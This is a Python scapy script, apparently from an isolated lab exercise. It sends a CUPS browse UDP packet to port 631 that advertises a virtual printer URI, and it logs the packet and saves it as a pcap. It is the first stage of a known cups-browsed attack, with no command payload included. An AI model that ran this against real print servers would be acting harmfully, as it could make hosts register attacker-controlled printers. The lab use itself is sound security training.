#!/usr/bin/env python3
import argparse
import logging
from pathlib import Path

from scapy.all import IP, UDP, Raw, send, wrpcap


def parse_int(value):
    return int(value, 0)


def main():
    parser = argparse.ArgumentParser(
        description="Advertise a virtual printer to the isolated CUPS lab."
    )
    parser.add_argument("--target", default="127.0.0.1",
                        help="CUPS address; default uses its localhost port mapping")
    parser.add_argument("--port", type=int, default=631,
                        help="CUPS browse UDP port")
    parser.add_argument("--printer-uri", required=True,
                        help="URI of the virtual printer to advertise")
    parser.add_argument("--location", default="Lab")
    parser.add_argument("--info", default="Scapy test printer")
    parser.add_argument("--printer-type", type=parse_int, default=0)
    parser.add_argument("--printer-state", type=parse_int, default=3)
    parser.add_argument("--pcap", default="pcap_files/task2_attack.pcap")
    parser.add_argument("--log-file", default="evidence/task2_attack.log")
    args = parser.parse_args()

    for field in (args.printer_uri, args.location, args.info):
        if any(char in field for char in ('"', "\r", "\n")):
            parser.error("Fields must not contain quotes or line breaks")

    message = (
        f'{args.printer_type:x} {args.printer_state:x} {args.printer_uri} '
        f'"{args.location}" "{args.info}"'
    )
    packet = IP(dst=args.target) / UDP(dport=args.port) / Raw(load=message.encode())

    pcap_path = Path(args.pcap)
    log_path = Path(args.log_file)
    pcap_path.parent.mkdir(parents=True, exist_ok=True)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[logging.StreamHandler(), logging.FileHandler(log_path)],
    )

    wrpcap(str(pcap_path), packet)
    logging.info("Sending discovery packet to %s:%d", args.target, args.port)
    logging.info("Advertised printer: %s", args.printer_uri)
    logging.info("Payload: %s", message)
    logging.info("Saved packet to %s", pcap_path)

    send(packet, verbose=False)


if __name__ == "__main__":
    main()
